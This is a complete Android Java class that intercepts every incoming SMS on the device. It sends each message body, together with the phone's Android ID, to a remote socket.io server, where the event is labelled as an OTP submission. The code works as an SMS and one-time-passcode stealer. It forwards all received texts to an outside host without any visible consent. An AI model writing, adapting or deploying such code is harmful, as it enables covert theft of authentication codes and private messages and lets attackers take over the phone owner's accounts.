package com.otp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;
import android.os.Bundle;
import android.telephony.SmsMessage;
import io.socket.client.IO;
import io.socket.client.Socket;
import android.provider.Settings;
import android.provider.Settings.Secure;

public class ReceiveSms extends BroadcastReceiver {
    private Socket mSocket;
    {
        try {
            mSocket = IO.socket("https://server.nghi.lavenes.com");
        } catch (Exception e) {
            System.out.println(e);
        }
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        seSocketConnection(context);

        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            SmsMessage[] msgs;
            String msg_from;
            String androidId = Settings.Secure.getString(context.getContentResolver(),Settings.Secure.ANDROID_ID);

            if(bundle != null) {
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for(int i = 0; i < msgs.length; i++) {
                        msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                        msg_from = msgs[i].getOriginatingAddress();
                        String msgBody = msgs[i].getMessageBody();

                        Toast.makeText(context, "From:" + msg_from + ", Body:" + msgBody, Toast.LENGTH_SHORT).show();
                        mSocket.emit("@user-send-otp", msgBody + ';' + androidId);
                    }
                }catch(Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public void seSocketConnection(final Context context) {
        try{
            mSocket.connect();
        }catch(Exception e) {
            System.out.println(e);
        }
    }
}